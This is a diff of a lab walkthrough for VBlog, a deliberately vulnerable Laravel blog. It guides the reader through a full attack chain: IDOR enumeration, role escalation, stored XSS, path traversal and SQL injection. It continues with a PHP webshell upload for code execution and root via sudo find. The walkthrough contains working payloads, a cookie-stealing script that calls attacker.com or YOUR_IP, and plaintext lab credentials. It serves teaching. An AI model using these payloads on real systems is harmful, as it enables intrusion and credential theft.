@@ -1,974 +1,497 @@
 # VBlog — Walkthrough
 
-## Table of Contents
+> Architecture reference: [arquitecture.md](arquitecture.md)
 
-1. [Setup](#setup)
-2. [Credentials](#credentials)
-3. [Vulnerabilities](#vulnerabilities)
-4. [Hidden Routes](#hidden-routes)
-5. [Hidden Subdomain](#hidden-subdomain)
-6. [Full Escalation Chain](#full-escalation-chain)
-
-> Detailed architecture: [docs/arquitecture.md](arquitecture.md)
+This guide walks through the full attack chain step by step. Each step tells you **what to do** — in the browser, in the terminal, or in DevTools — and **what to expect**.
 
 ---
-
-## Download/Install
-
-```bash
-git clone https://github.com/Andonigt04/VBlog.git
-```
 
 ## Setup
 
+**Terminal:**
 ```bash
+git clone https://github.com/Andonigt04/VBlog.git
+cd VBlog
 sudo docker compose up --build -d
 ```
 
-The app is accessible at `http://localhost` (no `/etc/hosts` configuration required).
-
-Students will discover through enumeration that `dev.vblog.local` exists as a subdomain and must add it manually to `/etc/hosts`.
+Open your browser and navigate to **http://localhost**. The blog should load.
 
 ---
 
-## Credentials
+## Phase 0 — Reconnaissance (no account needed)
 
-### Application Users
+### Step 1 — Browse the application
 
-| Role | Username | Email | Password |
-|---|---|---|---|
-| Admin | adm01 | adm01@vblog.local | adm01local |
-| Editor | editor01 | editor01@vblog.local | editor01pass |
-| User | (generated) | faker | faker |
+Open **http://localhost** in your browser.
 
-> Editor and admin credentials also appear at `/backup` (intentional vulnerability).
+- Browse around: read posts, click categories, look at the navigation bar.
+- Note: there is a **Login** and **Sign up** button. No admin link is visible.
+- Check the page source (right-click → View Page Source or `Ctrl+U`). Look for comments, hidden links, or metadata.
 
-### Database
+### Step 2 — Enumerate hidden routes
 
-| Field | Value |
-|---|---|
-| Host | postgresql (internal) / localhost:5432 (external) |
-| Database | vblog |
-| User | vblog_adm |
-| Password | uireh34t34 |
-
-### Direct DB Access (from host)
-
+**Terminal:**
 ```bash
-psql -h localhost -p 5432 -U vblog_adm -d vblog
-# password: uireh34t34
+gobuster dir -u http://localhost \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,txt,html \
+  -t 50
 ```
 
----
+Wait for the scan to finish. You should find:
 
-## Vulnerabilities
+| Route | Status | Notes |
+|---|---|---|
+| `/backup` | 200 | Contains credentials |
+| `/debug` | 200 | Technology info |
+| `/old` | 302 | Redirects to `/` |
+| `/internal` | 403 | Forbidden (decoy) |
+| `/admin` | 302 | Redirects to `/dashboard` |
 
----
+### Step 3 — Read the exposed files
 
-### 1. IDOR — Unauthenticated Access to Resources
+**Browser:** Go to **http://localhost/backup**
 
-**Location:** `GET /api/users/{id}`, `GET /api/posts/{id}`, `GET /api/comments`
-
-**Why it exists:** Routes have no `auth` middleware.
-
-#### Exploitation
-
-**Step 1: Enumerate users without being logged in**
-```bash
-curl http://vblog.local/api/users/1
-curl http://vblog.local/api/users/2
-# ... iterate until admin is found (typically id 52)
-curl http://vblog.local/api/users/52
+You will see plaintext credentials:
 ```
-
-**Expected output:**
-```json
-{
-  "id": 52,
-  "name": "adm01",
-  "email": "adm01@vblog.local",
-  "role": "admin",
-  "created_at": "..."
-}
-```
-
-**Step 2: Get all comments without auth**
-```bash
-curl http://localhost/api/comments
-```
-
-**Impact:**
-- Full user enumeration (emails, roles, names)
-- Access to all comment data
-- Enables targeted attacks (phishing, brute force against admin accounts)
-
-#### Vulnerability Verification
-
-**Code location:** `routes/api.php`
-```php
-Route::get('/users/{id}', [UserController::class, 'show']);   // ← NO auth middleware
-Route::get('/comments', [CommentController::class, 'index']); // ← NO auth middleware
-```
-
-#### Full Patch
-
-**File:** `routes/api.php`
-
-```php
-// vulnerable
-Route::get('/users/{id}', [UserController::class, 'show']);
-Route::get('/comments', [CommentController::class, 'index']);
-
-// patched
-Route::get('/users/{id}', [UserController::class, 'show'])->middleware('auth');
-Route::get('/comments', [CommentController::class, 'index'])->middleware('auth');
-```
-
-#### Patch Validation
-
-```bash
-# Should fail with 401 Unauthorized
-curl http://vblog.local/api/users/1
-# Expected: {"status": 401, "message": "Unauthenticated"}
-
-# Should work with authenticated session
-curl -b cookies.txt http://vblog.local/api/users/1
-```
-
----
-
-### 2. Mass Assignment — Role Escalation via API
-
-**Location:** `PUT /api/update/user/{id}` in UserController
-
-**Why it exists:**
-- `UserController::update()` uses `$user->update($request->all())` without filtering fields
-- The `User` model has `role` in its `$fillable` array, allowing mass modification
-
-#### Exploitation
-
-**Step 1: Create a basic user account**
-```bash
-# Via web: register at /signup
-# Or use credentials found at /backup
-```
-
-**Step 2: Log in and save session**
-```bash
-curl -c cookies.txt -X POST http://vblog.local/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"user@test.com","passkey":"password"}'
-```
-
-**Step 3: Verify current role**
-```bash
-curl -b cookies.txt http://vblog.local/api/me
-# Output: {"id": 53, "role": "user", ...}
-```
-
-**Step 4: Escalate to editor**
-```bash
-curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
-  -H "Content-Type: application/json" \
-  -d '{"role":"editor"}'
-```
-
-**Step 5: Escalate to admin**
-```bash
-curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
-  -H "Content-Type: application/json" \
-  -d '{"role":"admin"}'
-```
-
-**Impact:**
-- Immediate privilege elevation
-- Regular user → Admin without additional authentication
-- Access to the admin panel
-
-#### Vulnerability Verification
-
-**Location:** `app/Http/Controllers/UserController.php`
-
-```php
-public function update(Request $request, $id)
-{
-    $user->update($request->all());  // ← Accepts ALL fields
-}
-```
-
-**Location:** `app/Models/User.php`
-
-```php
-#[Fillable(['name', 'email', 'role', 'password'])]  // ← 'role' allowed
-class User extends Model { ... }
-```
-
-#### Full Patch
-
-**File 1:** `app/Http/Controllers/UserController.php`
-
-```php
-// ✅ AFTER (protected)
-public function update(Request $request, $id)
-{
-    try {
-        $user = User::findOrFail($id);
-
-        if ($user->id !== Auth::id() && Auth::user()->role !== 'admin') {
-            return response()->json(['status' => 403, 'message' => 'Unauthorized'], 403);
-        }
-
-        $validated = $request->validate([
-            'name'     => 'nullable|string|max:255',
-            'email'    => 'nullable|email|unique:users,email,' . $id,
-            'password' => 'nullable|string|min:8'
-        ]);
-
-        $user->update($validated);
-        return response()->json(['status' => 200, 'user' => $user]);
-    }
-}
-```
-
-#### Patch Validation
-
-```bash
-# Escalation attempt should fail
-curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
-  -H "Content-Type: application/json" \
-  -d '{"role":"admin"}'
-# Expected: {"status": 403, "message": "Unauthorized"}
-
-# Changing own email should work
-curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
-  -H "Content-Type: application/json" \
-  -d '{"email":"newemail@test.com"}'
-# Expected: {"status": 200, "user": {...}}
-```
-
----
-
-### 3. Broken Access Control — Dashboard Without Role Check
-
-**Location:** `GET /dashboard` in `routes/web.php`
-
-**Why it exists:** Middleware only checks `auth` (session active), not that the user is an admin.
-
-#### Exploitation
-
-```bash
-# Log in as regular user, then access dashboard directly
-curl -b cookies.txt http://vblog.local/dashboard
-# Response: 200 OK with full admin panel HTML
-```
-
-**Impact:**
-- Regular user sees admin data
-- Access to sensitive information about other users
-
-#### Full Patch
-
-```php
-// ✅ AFTER (protected)
-Route::get('/dashboard', function (Request $request) {
-    if (Auth::user()->role !== 'admin') {
-        abort(403, 'Admin access required');
-    }
-    $users    = User::orderBy('created_at', 'desc')->paginate(10);
-    $posts    = Post::orderBy('created_at', 'desc')->paginate(10);
-    $comments = Comment::orderBy('created_at', 'desc')->paginate(10);
-    return view('dashboard', compact('users', 'posts', 'comments', ...));
-})->middleware('auth');
-```
-
-#### Patch Validation
-
-```bash
-# Regular user attempting access
-curl -b cookies.txt http://vblog.local/dashboard
-# Expected: 403 Forbidden
-
-# Admin user accessing
-curl -b admin_cookies.txt http://vblog.local/dashboard
-# Expected: 200 OK with panel
-```
-
----
-
-### 4. Insecure Cookies
-
-**Location:** `config/session.php`
-
-**Why it exists:** Security flags intentionally disabled.
-
-#### Vulnerability
-
-```php
-'http_only' => env('SESSION_HTTP_ONLY', false),  // ← FALSE = JavaScript can read
-'secure'    => env('SESSION_SECURE_COOKIE'),      // ← NOT SET = sent over HTTP
-'same_site' => env('SESSION_SAME_SITE', null),    // ← NULL = no SameSite
-```
-
-#### Exploitation
-
-**Step 1: Inject XSS in a comment (vuln #5)**
-
-```javascript
-<script>
-  fetch('http://attacker.com/?c=' + document.cookie);
-</script>
-```
-
-**Step 2: Admin visits the post with the XSS comment**
-```
-→ JavaScript executes in admin context
-→ Session cookie sent to attacker.com
-→ Attacker can impersonate the admin
-```
-
-#### Full Patch
-
-```php
-// ✅ AFTER (secure)
-'http_only' => env('SESSION_HTTP_ONLY', true),
-'secure'    => env('SESSION_SECURE_COOKIE', true),
-'same_site' => env('SESSION_SAME_SITE', 'lax'),
-```
-
-#### Patch Validation
-
-```bash
-curl -v http://vblog.local/ 2>&1 | grep Set-Cookie
-# Should show:
-# Set-Cookie: LARAVEL_SESSION=...; path=/; HttpOnly; SameSite=Lax
-```
-
----
-
-### 5. Missing Security Headers
-
-**Location:** `nginx/server.conf`
-
-**Why it exists:** Lines intentionally commented out.
-
-#### Vulnerability
-
-```nginx
-# add_header X-Frame-Options "SAMEORIGIN";
-# ↑ Without this: app embeddable in iframes (clickjacking)
-
-# add_header X-Content-Type-Options "nosniff";
-# ↑ Without this: browser may misinterpret MIME types
-```
-
-#### Exploitation
-
-```html
-<!-- Clickjacking: embed the app in an invisible iframe -->
-<iframe src="http://vblog.local/dashboard"
-        style="opacity: 0; position: absolute; width: 100%; height: 100%;">
-</iframe>
-```
-
-#### Full Patch
-
-```nginx
-add_header X-Frame-Options "SAMEORIGIN";
-add_header X-Content-Type-Options "nosniff";
-add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'";
-add_header Referrer-Policy "strict-origin-when-cross-origin";
-add_header Permissions-Policy "geolocation=(), microphone=(), camera=()";
-```
-
-#### Patch Validation
-
-```bash
-docker compose restart nginx
-curl -I http://vblog.local/
-# Should show:
-# X-Frame-Options: SAMEORIGIN
-# X-Content-Type-Options: nosniff
-```
-
----
-
-### 6. Stored XSS — Comment Injection
-
-**Location:**
-- `resources/views/layouts/comment.blade.php`
-- `app/Http/Controllers/CommentController.php`
-
-**Why it exists:**
-- Content rendered unescaped: `{!! $comment->content !!}`
-- No sanitization before saving
-
-#### Exploitation
-
-```bash
-curl -b cookies.txt -X POST http://vblog.local/comments \
-  -d "post_id=1&content=<script>alert(document.cookie)</script>&_token=CSRF_TOKEN"
-```
-
-**Any user visiting the post:**
-- Script executes in their browser
-- If `HttpOnly` is false, the cookie can be stolen
-- Especially dangerous if an admin visits the post
-
-#### Full Patch
-
-**File 1:** `resources/views/layouts/comment.blade.php`
-
-```blade
-{{-- ✅ AFTER (escaped) --}}
-<p id="comment-text-{{ $comment->id }}" class="text-zinc-200">
-    {{ $comment->content }}
-</p>
-```
-
-**File 2:** `app/Http/Controllers/CommentController.php`
-
-```php
-// ✅ AFTER (sanitized)
-Comment::create([
-    'content' => strip_tags($validated['content']),
-    'user_id' => Auth::id(),
-    'post_id' => $validated['post_id'],
-]);
-```
-
----
-
-### 7. Information Disclosure
-
-**Locations:**
-- `routes/web.php` (`/backup`, `/debug`)
-- `GET /api/users` without auth
-
-#### Exploitation
-
-**Step 1: Access `/backup`**
-
-```bash
-curl http://vblog.local/backup
-```
-
-**Expected output:**
-```
-[APP_CREDENTIALS]
 editor_user=editor01
 editor_pass=editor01pass
 admin_user=adm01
 admin_email=adm01@vblog.local
 admin_pass=adm01local
 
-[DATABASE]
 host=postgresql
-port=5432
 database=vblog
 user=vblog_adm
 password=uireh34t34
 ```
 
-**Step 2: Access `/debug`**
+**Save these.** You will use them throughout the exercise.
 
+**Browser:** Go to **http://localhost/debug**
+
+You will see a JSON response with the PHP version, database driver, and user count. Note the exact values — they help you craft exploits later.
+
+### Step 4 — Enumerate users via IDOR
+
+The API exposes user data without requiring a login.
+
+**Terminal:**
 ```bash
-curl http://vblog.local/debug
+# Read user 1
+curl http://localhost/api/users/1
+
+# Iterate to find the admin (usually the last seeded user, around id 52)
+for i in $(seq 1 55); do
+  echo -n "id=$i: "
+  curl -s http://localhost/api/users/$i | grep -o '"role":"[^"]*"'
+done
+```
+
+Or in your **browser**, open **http://localhost/api/users/1** and increment the number in the URL until you find `"role":"admin"`.
+
+**Expected output for the admin user:**
+```json
+{
+  "id": 52,
+  "name": "adm01",
+  "email": "adm01@vblog.local",
+  "role": "admin"
+}
+```
+
+### Step 5 — Enumerate hidden subdomains
+
+**Terminal:**
+```bash
+gobuster vhost -u http://localhost \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  --append-domain \
+  -t 30
+```
+
+You should discover: **dev.vblog.local**
+
+**Add it to your hosts file:**
+```bash
+echo "127.0.0.1  dev.vblog.local" | sudo tee -a /etc/hosts
+```
+
+**Browser:** Open **http://dev.vblog.local**
+
+Explore the three pages:
+- `/` — environment overview (framework, DB, PHP version)
+- `/api-docs.html` — internal API documentation with endpoint details
+- `/logs.html` — application logs showing DB connection strings, API calls, and other traces
+
+> In `/logs.html` you will find the full DB connection string and traces of mass assignment requests — useful hints for the next phases.
+
+---
+
+## Phase 1 — Register and log in
+
+### Step 1 — Create an account
+
+**Browser:** Go to **http://localhost/signup**
+
+Fill in:
+- **Username:** `hacker` (or any name you prefer)
+- **Password:** `password123`
+
+Click **Create account**. You will be redirected to the home page as a logged-in user.
+
+### Step 2 — Check your session
+
+Open **DevTools** (`F12`) → **Application** tab → **Cookies** → `http://localhost`
+
+You will see a cookie named `laravel_session`. Notice that **HttpOnly is not checked** — this means JavaScript can read this cookie (exploited in Phase 3).
+
+### Step 3 — Find your user ID and role
+
+**Terminal:**
+```bash
+# Log in and save the session cookie
+curl -c /tmp/cookies.txt -X POST http://localhost/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"hacker@example.com","passkey":"password123"}'
+
+# Check your current user info
+curl -b /tmp/cookies.txt http://localhost/api/me
 ```
 
 **Expected output:**
 ```json
-{
-  "app": "VBlog",
-  "php": "8.4.x",
-  "db_driver": "pgsql",
-  "users": 52,
-  "server": "nginx/1.27.0"
-}
+{"id": 53, "name": "hacker", "email": "...", "role": "user"}
 ```
 
-**Impact:**
-- Admin credentials in plaintext
-- Database connection string
-- Technology fingerprinting (facilitates exploit search)
-
-#### Full Patch
-
-```php
-// ✅ AFTER (protected)
-Route::get('/backup', function () {
-    if (Auth::guest() || Auth::user()->role !== 'admin') {
-        abort(403);
-    }
-    // ...
-})->middleware('auth');
-
-Route::get('/debug', function () {
-    if (Auth::guest() || Auth::user()->role !== 'admin') {
-        abort(403);
-    }
-    return response()->json([...]);
-})->middleware('auth');
-```
+Write down your **user ID** (e.g., `53`). You will use it in the next step.
 
 ---
 
-### 8. Path Traversal — Arbitrary File Read (admin)
+## Phase 2 — Privilege Escalation (Mass Assignment)
 
-**Location:** `GET /api/admin/file?path=` in `AdminController::fileRead()`
+The update endpoint accepts any fields you send — including `role`. There is no check to prevent a regular user from promoting themselves to admin.
 
-**OWASP:** A01 — Broken Access Control / A05 — Security Misconfiguration  
-**CWE:** CWE-22 (Path Traversal)
+### Step 1 — Escalate to admin
 
-**Why it exists:** The `path` parameter is concatenated directly with `base_path()` without normalization or allowlist.
-
-#### Exploitation
-
-**Prerequisite:** Session with `role=admin` (obtained from vuln #2).
-
-**Step 1: Read the app's `.env`**
+**Terminal** (replace `53` with your actual user ID):
 ```bash
-curl -b cookies.txt \
-  "http://localhost/api/admin/file?path=.env"
+curl -b /tmp/cookies.txt -X PUT http://localhost/api/update/user/53 \
+  -H "Content-Type: application/json" \
+  -d '{"role":"admin"}'
 ```
-Output: full `.env` content with `APP_KEY`, DB credentials, etc.
 
-**Step 2: Break out of the app directory**
+You can also do this **with Burp Suite**:
+1. Open Burp Suite → Proxy → Intercept ON
+2. In the browser, go to **http://localhost/profile** and click **Save changes** (any change)
+3. In Burp, change the method from `POST` to `PUT`, the URL to `/api/update/user/53`, and replace the body with `{"role":"admin"}`
+4. Forward the request
+
+### Step 2 — Verify the escalation
+
+**Terminal:**
 ```bash
-curl -b cookies.txt \
+curl -b /tmp/cookies.txt http://localhost/api/me
+```
+
+**Expected output:**
+```json
+{"id": 53, "name": "hacker", "role": "admin"}
+```
+
+**Browser:** Refresh the page. You should now see an **Admin** or **Dashboard** link in the navigation.
+
+### Step 3 — Access the admin dashboard
+
+**Browser:** Go to **http://localhost/dashboard**
+
+Even though you just changed your own role via the API, the dashboard lets you in — it only checks that you are authenticated, not that you are actually an admin (Broken Access Control).
+
+You will see lists of all users, posts, and comments on the server.
+
+---
+
+## Phase 3 — Stored XSS + Internal Panel
+
+### Step 1 — Inject a malicious comment
+
+**Browser:** Go to any blog post (click a title on the home page).
+
+Scroll down to the comment form. In the **comment text box**, type:
+
+```html
+<script>alert(document.cookie)</script>
+```
+
+Click **Post comment**.
+
+**Browser:** Reload the post page. A dialog box will appear showing your session cookie. This confirms the XSS is working.
+
+### Step 2 — Steal a cookie (proof of concept)
+
+To demonstrate real impact, you would send the cookie to an external server. In a lab setting:
+
+**Terminal — start a listener:**
+```bash
+python3 -m http.server 8888
+```
+
+**Browser:** Post a new comment with this payload (replace the IP with your machine's IP):
+```html
+<script>fetch('http://YOUR_IP:8888/?c='+document.cookie)</script>
+```
+
+When any user (including an admin) visits that post, their cookie will be sent to your listener.
+
+**Terminal:** Watch the output — you will see a request like:
+```
+GET /?c=laravel_session=eyJ... HTTP/1.1
+```
+
+That cookie can be used to impersonate the session owner.
+
+### Step 3 — Explore the internal panel
+
+If you haven't done so already, add the subdomain to your hosts file and open it:
+
+**Browser:** Go to **http://dev.vblog.local/logs.html**
+
+Read the logs carefully. You will find:
+- The PostgreSQL connection string with credentials
+- API call traces, including mass assignment attempts
+- Other internal information useful for the remaining phases
+
+---
+
+## Phase 4 — Admin API: Path Traversal and SQL Injection
+
+You need an active admin session. Use the cookie from the terminal or stay logged in via the browser.
+
+### Step 1 — Read server files (Path Traversal)
+
+**Terminal:**
+```bash
+# Read the application's .env file
+curl -b /tmp/cookies.txt \
+  "http://localhost/api/admin/file?path=.env"
+
+# Break out of the app directory
+curl -b /tmp/cookies.txt \
   "http://localhost/api/admin/file?path=../../etc/passwd"
 ```
-Output: `/etc/passwd` from the container → list of system users.
 
-**Impact:**
-- Read any file readable by `www-data`
-- Exposure of private keys, `.env`, service configurations
-- Enables more precise SQLi payloads or upload path discovery
-
-#### Vulnerability Verification
-
-**File:** [app/Http/Controllers/AdminController.php](../../app/Http/Controllers/AdminController.php)
-```php
-public function fileRead(Request $request)
-{
-    $path     = $request->query('path', '');
-    $fullPath = base_path($path);           // ← no validation
-    return response(file_get_contents($fullPath), 200)
-        ->header('Content-Type', 'text/plain');
-}
+**Browser:** You can also test this directly in the URL bar:
+```
+http://localhost/api/admin/file?path=../../etc/passwd
 ```
 
-#### Full Patch
+The response will contain `/etc/passwd` from inside the container — confirming you can read arbitrary files.
 
-```php
-// ✅ AFTER (directory allowlist + normalization)
-public function fileRead(Request $request)
-{
-    $path     = $request->query('path', '');
-    $fullPath = realpath(base_path($path));
-    $allowed  = realpath(base_path('storage/app'));
-
-    if (!$fullPath || !str_starts_with($fullPath, $allowed)) {
-        abort(403, 'Path not allowed');
-    }
-
-    return response(file_get_contents($fullPath), 200)
-        ->header('Content-Type', 'text/plain');
-}
-```
-
-#### Patch Validation
-
+Other interesting files to try:
 ```bash
-# Should fail
-curl -b cookies.txt "http://localhost/api/admin/file?path=../../etc/passwd"
-# Expected: 403 Forbidden
+# Nginx config
+curl -b /tmp/cookies.txt "http://localhost/api/admin/file?path=../../etc/nginx/nginx.conf"
 
-# Should work only inside storage/app
-curl -b cookies.txt "http://localhost/api/admin/file?path=storage/app/info.txt"
+# SSH keys (if present)
+curl -b /tmp/cookies.txt "http://localhost/api/admin/file?path=../../root/.ssh/id_rsa"
 ```
 
----
+### Step 2 — Trigger a SQL error (SQL Injection)
 
-### 9. SQL Injection — Injectable Filter in Stats Endpoint (admin)
-
-**Location:** `GET /api/admin/stats?filter=` in `AdminController::stats()`
-
-**OWASP:** A03 — Injection  
-**CWE:** CWE-89 (SQL Injection)
-
-**Why it exists:** The `filter` value is interpolated directly into a raw SQL query without `DB::select()` bindings or preparation.
-
-#### Exploitation
-
-**Step 1: Confirm injection with an error**
+**Terminal:**
 ```bash
-curl -b cookies.txt \
+curl -b /tmp/cookies.txt \
   "http://localhost/api/admin/stats?filter='"
-# Output: 500 with PostgreSQL SQL trace
 ```
 
-**Step 2: Time-based blind (confirm execution)**
+**Browser:** Open:
+```
+http://localhost/api/admin/stats?filter='
+```
+
+You will see a **500 Internal Server Error** with a PostgreSQL stack trace. This confirms the filter parameter is injected directly into the SQL query.
+
+### Step 3 — Confirm blind injection (time-based)
+
+**Terminal:**
 ```bash
-curl -b cookies.txt \
-  "http://localhost/api/admin/stats?filter=%' AND (SELECT 1 FROM pg_sleep(3))=1 AND '%'='"
-# Response takes ≥3 s → confirmed
+# This should take at least 3 seconds to respond
+curl -b /tmp/cookies.txt \
+  "http://localhost/api/admin/stats?filter=%25%27%20AND%20(SELECT%201%20FROM%20pg_sleep(3))%3D1%20AND%20%27%25%27%3D%27"
 ```
 
-**Step 3: Data extraction with sqlmap**
+If the response is delayed by ~3 seconds, the injection is confirmed.
+
+### Step 4 — Dump the database with sqlmap
+
+**Terminal:**
 ```bash
 sqlmap -u "http://localhost/api/admin/stats?filter=test" \
-  --cookie="$(grep -v '^#' /tmp/cookies.txt | awk '/laravel_session/{print $6"="$7}')" \
-  --dbms=postgresql --level=3 --risk=2 --batch \
+  --cookie="laravel_session=PASTE_YOUR_SESSION_COOKIE_HERE" \
+  --dbms=postgresql \
+  --level=3 --risk=2 \
+  --batch \
   --dump -T users
 ```
 
-**Impact:**
-- Full database dump
-- File read/write (`COPY TO/FROM`) if the DB user has permissions
-- Possible OS command execution in older PostgreSQL configurations
-
-#### Vulnerability Verification
-
-**File:** [app/Http/Controllers/AdminController.php](../../app/Http/Controllers/AdminController.php)
-```php
-public function stats(Request $request)
-{
-    $filter = $request->query('filter', '');
-    $rows   = DB::select(
-        "SELECT posts.id, posts.title, posts.tags
-         FROM posts
-         WHERE posts.tags LIKE '%{$filter}%'"  // ← direct interpolation
-    );
-    return response()->json(['status' => 200, 'data' => $rows]);
-}
-```
-
-#### Full Patch
-
-```php
-// ✅ AFTER (binding with placeholder)
-public function stats(Request $request)
-{
-    $filter = $request->query('filter', '');
-    $rows   = DB::select(
-        "SELECT posts.id, posts.title, posts.tags
-         FROM posts
-         WHERE posts.tags LIKE ?",
-        ["%{$filter}%"]   // ← safe binding
-    );
-    return response()->json(['status' => 200, 'data' => $rows]);
-}
-```
-
-#### Patch Validation
-
-```bash
-curl -b cookies.txt \
-  "http://localhost/api/admin/stats?filter=%27%20OR%201=1--"
-# Expected: [] or normal results, NOT an SQL trace
-```
+This will extract all rows from the `users` table, including password hashes.
 
 ---
 
-### 10. Insecure File Upload — Webshell via Unrestricted Upload (admin)
+## Phase 5 — Remote Code Execution via File Upload
 
-**Location:** `POST /api/admin/upload` in `AdminController::upload()`
+The admin upload endpoint saves files with the original filename into a public directory. There is no extension check.
 
-**OWASP:** A04 — Insecure Design / A05 — Security Misconfiguration  
-**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
+### Step 1 — Create a webshell
 
-**Why it exists:** The server saves the file with the original name without checking the extension and places it in `public/avatars/`, a directory served directly by nginx.
-
-#### Exploitation
-
-**Step 1: Create the webshell**
+**Terminal:**
 ```bash
 echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > /tmp/shell.php
 ```
 
-**Step 2: Upload to the server**
+### Step 2 — Upload the webshell
+
+**Terminal:**
 ```bash
-curl -b cookies.txt -X POST http://localhost/api/admin/upload \
+curl -b /tmp/cookies.txt -X POST http://localhost/api/admin/upload \
   -F "file=@/tmp/shell.php;type=image/jpeg"
-# Output: {"url":"http://localhost/avatars/shell.php"}
 ```
 
-**Step 3: Execute remote commands (RCE)**
+**Expected response:**
+```json
+{"url": "http://localhost/avatars/shell.php"}
+```
+
+### Step 3 — Execute remote commands
+
+The shell accepts commands encoded in base64 via the `cmd` parameter.
+
+**Terminal:**
 ```bash
-# Process identity
-curl "http://localhost/avatars/shell.php?cmd=aWQ="         # id
+# Encode a command
+echo -n "id" | base64
+# Output: aWQ=
+
+# Run it
+curl "http://localhost/avatars/shell.php?cmd=aWQ="
 # Output: uid=33(www-data) gid=33(www-data)
-
-# List sensitive files
-curl "http://localhost/avatars/shell.php?cmd=bHMgLWxhIC9ldGMv"  # ls -la /etc/
 ```
 
-**Impact:**
-- Remote Code Execution as `www-data`
-- Pivot to the database, internal network, or local escalation
-- Persistence in the container
-
-#### Vulnerability Verification
-
-**File:** [app/Http/Controllers/AdminController.php](../../app/Http/Controllers/AdminController.php)
-```php
-public function upload(Request $request)
-{
-    $file     = $request->file('file');
-    $filename = $file->getClientOriginalName();  // ← attacker-controlled name
-    $file->move(public_path('avatars'), $filename);
-    return response()->json(['url' => url("avatars/{$filename}")], 201);
-}
+**Browser:** You can also test in the URL bar:
+```
+http://localhost/avatars/shell.php?cmd=aWQ=
 ```
 
-#### Full Patch
-
-```php
-// ✅ AFTER (allowlist + random filename)
-public function upload(Request $request)
-{
-    $request->validate([
-        'file' => 'required|file|mimes:jpeg,png,gif,webp|max:2048',
-    ]);
-
-    $file     = $request->file('file');
-    $filename = Str::uuid() . '.' . $file->extension();
-    $file->move(public_path('avatars'), $filename);
-
-    return response()->json(['url' => url("avatars/{$filename}")], 201);
-}
-```
-
-**Additional measure:** configure nginx to block PHP execution in `public/avatars/`:
-```nginx
-location ~* ^/avatars/.*\.php$ {
-    deny all;
-}
-```
-
-#### Patch Validation
-
+More commands:
 ```bash
-# Uploading shell.php should be rejected
-curl -b cookies.txt -X POST http://localhost/api/admin/upload \
-  -F "file=@/tmp/shell.php"
-# Expected: 422 Unprocessable Entity
+# List /etc
+echo -n "ls -la /etc/" | base64
+curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'ls -la /etc/' | base64 -w0)"
 
-# Uploading a valid image should work
-curl -b cookies.txt -X POST http://localhost/api/admin/upload \
-  -F "file=@photo.jpg;type=image/jpeg"
-# Expected: 201 with URL
+# Read /etc/passwd
+curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'cat /etc/passwd' | base64 -w0)"
+
+# Hostname
+curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'hostname' | base64 -w0)"
 ```
+
+You now have **Remote Code Execution** as `www-data` on the server.
 
 ---
 
-### 11. Privilege Escalation — From www-data to root
+## Phase 6 — Escalation to root
 
-**Location:** Dockerfile — sudoers + SUID bash
+### Step 1 — Check sudo privileges
 
-**OWASP:** A06 — Vulnerable and Outdated Components / A05 — Security Misconfiguration  
-**CWE:** CWE-269 (Improper Privilege Management)
-
-**Why it exists:** The Dockerfile adds two intentional misconfigurations:
-1. `www-data` can run `/usr/bin/find` as root without a password
-2. `/tmp/rootbash` is a copy of `/bin/bash` with the SUID bit set
-
-#### Exploitation
-
-**Prerequisite:** RCE obtained in vuln #10 (active webshell).
-
-**Step 1: Check sudo**
+**Terminal:**
 ```bash
-curl "http://localhost/avatars/shell.php?cmd=c3VkbyAtbA=="
-# base64: sudo -l
-# Output: (root) NOPASSWD: /usr/bin/find
+curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'sudo -l' | base64 -w0)"
 ```
 
-**Step 2: GTFOBins — use find with sudo to execute a command as root**
+**Expected output:**
+```
+User www-data may run the following commands on ...:
+    (root) NOPASSWD: /usr/bin/find
+```
+
+### Step 2 — Exploit via GTFOBins (sudo find)
+
+The `find` binary can execute commands with `-exec`. Since we can run `find` as root with no password, we can execute anything as root.
+
+**Terminal:**
 ```bash
-CMD=$(echo 'sudo find . -exec /bin/sh -c '"'"'id > /tmp/pwned'"'"' \; -quit' | base64 -w0)
-curl "http://localhost/avatars/shell.php?cmd=$CMD"
+# Run a command as root and save the output
+curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'sudo find . -exec /bin/sh -c "id > /tmp/pwned" \; -quit' | base64 -w0)"
 
-curl "http://localhost/avatars/shell.php?cmd=$(echo 'cat /tmp/pwned' | base64 -w0)"
-# Output: uid=0(root) gid=0(root) ← ROOT
+# Read the result
+curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'cat /tmp/pwned' | base64 -w0)"
 ```
 
-**Step 3 (alternative): SUID bash**
+**Expected output:**
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**You have root.**
+
+### Step 3 — Alternative: SUID bash
+
+**Terminal:**
 ```bash
-CMD=$(echo '/tmp/rootbash -p -c id' | base64 -w0)
-curl "http://localhost/avatars/shell.php?cmd=$CMD"
-# Output: uid=33(www-data) euid=0(root) ← effective SUID
+# Check if rootbash exists
+curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'ls -la /tmp/rootbash' | base64 -w0)"
+
+# Execute it with -p (preserve effective UID)
+curl "http://localhost/avatars/shell.php?cmd=$(echo -n '/tmp/rootbash -p -c id' | base64 -w0)"
 ```
 
-**Impact:**
-- Full container control as root
-- Read system secrets (`/etc/shadow`, SSH keys)
-- Possible container escape if the Docker socket is mounted
-
-#### Vulnerability Verification
-
-**File:** [Dockerfile](../../Dockerfile)
-```dockerfile
-RUN echo "www-data ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/www-data \
-    && chmod 0440 /etc/sudoers.d/www-data \
-    && cp /bin/bash /tmp/rootbash \
-    && chmod u+s /tmp/rootbash
